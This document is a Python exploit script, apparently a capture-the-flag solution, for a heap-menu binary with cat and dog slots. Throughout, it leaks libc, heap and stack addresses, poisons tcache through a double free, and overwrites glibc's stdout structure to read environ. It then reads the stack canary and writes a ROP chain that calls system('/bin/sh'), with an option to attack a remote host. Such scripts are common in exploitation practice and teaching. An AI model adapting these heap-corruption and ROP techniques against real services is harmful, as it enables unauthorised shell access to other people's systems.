#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

context.log_level = 'debug'
exe = context.binary = ELF('./main_patched', checksec=False)
libc = exe.libc

gdbscript = '''
init-pwndbg
# init-gef-bata
b *0x401744
b *0x40183A
b *0x401931
b *0x401A0F
b *0x40159A
b *0x4013AD
b *0x4014A3
b *0x401678
c
'''

def start(argv=[]):
    if args.LOCAL:
        p = exe.process()
    elif args.REMOTE:
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p

def choice(option: int):
    slna(b'choice: ', option)

def get_cat(idx: int):
    choice(1)
    slna(b': ', idx)

def see_cat(idx: int):
    choice(2)
    slna(b': ', idx)

def pet_cat(idx: int, data: bytes):
    choice(3)
    slna(b': ', idx)
    sa(b': ', data)

def release_cat(idx: int):
    choice(4)
    slna(b': ', idx)

def get_dog(idx: int):
    choice(5)
    slna(b': ', idx)

def see_dog(idx: int):
    choice(6)
    slna(b': ', idx)

def pet_dog(idx: int, data: bytes):
    choice(7)
    slna(b': ', idx)
    sa(b': ', data)

def release_dog(idx: int):
    choice(8)
    slna(b': ', idx)

# ==================== EXPLOIT ====================
p = start()

for i in range(9):
    get_cat(i)

for i in range(6):
    release_cat(i)

release_cat(8) # Avoid top-chunk consolidation
release_cat(7) # Free victim chunk

see_cat(7)
ru(b'A cat says: ')
libc.address = u64(rl()[:8]) - 0x21ace0
slog('libc base @ %#x', libc.address)

see_cat(0)
ru(b'A cat says: ')
heap_base = u64(rl()[:6].ljust(0x8, b'\0')) << 12
slog('heap base @ %#x', heap_base)

release_cat(6) # Consolidate with chunk at index 6
get_cat(9) # Pick up 1 chunk in tcache
release_cat(7) # Double-free chunk 7, this chunk will go to tcache

get_dog(0)

pet_dog(0, b'\0' * 0x98 + p64(0xa1) + p64(mangle(heap_base, libc.sym._IO_2_1_stdout_)))
get_cat(10)

get_cat(11) # Take _IO_2_1_stdout_

'''
type = struct _IO_FILE {
/* 0x0000      |  0x0004 */    int _flags;
/* XXX  4-byte hole      */
/* 0x0008      |  0x0008 */    char *_IO_read_ptr;
/* 0x0010      |  0x0008 */    char *_IO_read_end;
/* 0x0018      |  0x0008 */    char *_IO_read_base;
/* 0x0020      |  0x0008 */    char *_IO_write_base;
/* 0x0028      |  0x0008 */    char *_IO_write_ptr;
/* 0x0030      |  0x0008 */    char *_IO_write_end;
/* 0x0038      |  0x0008 */    char *_IO_buf_base;
/* 0x0040      |  0x0008 */    char *_IO_buf_end;
'''

pet_cat(11, flat(
        0xfbad1800,
        0, 0, 0,
        libc.sym.environ,
        libc.sym.environ + 0x8,
        libc.sym.environ + 0x8,
        libc.sym.environ + 0x8,
        libc.sym.environ + 0x9
    ))

stack_leak = u64(rb(8))
slog('stack leak @ %#x', stack_leak)

release_cat(10)
pet_dog(0, b'\0' * 0x98 + p64(0xa1) + p64(mangle(heap_base, stack_leak - 0x158)))

get_cat(12)
get_cat(13)

if args.GDB:
    gdb.attach(p, gdbscript=gdbscript)
    pause()

see_cat(13)
ru(b'A cat says: ')
rb(8)
canary = u64(rb(8))
slog('canary @ %#x', canary)

release_cat(10)
pet_dog(0, b'\0' * 0x98 + p64(0xa1) + p64(mangle(heap_base, stack_leak - 0x158)))

get_cat(14)
get_cat(15)

rop = ROP(libc)
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
ret = pop_rdi + 1

pet_cat(15, flat(
    0, canary, 0,
    pop_rdi,
    next(libc.search(b'/bin/sh\0')),
    ret,
    libc.sym.system
))

interactive()
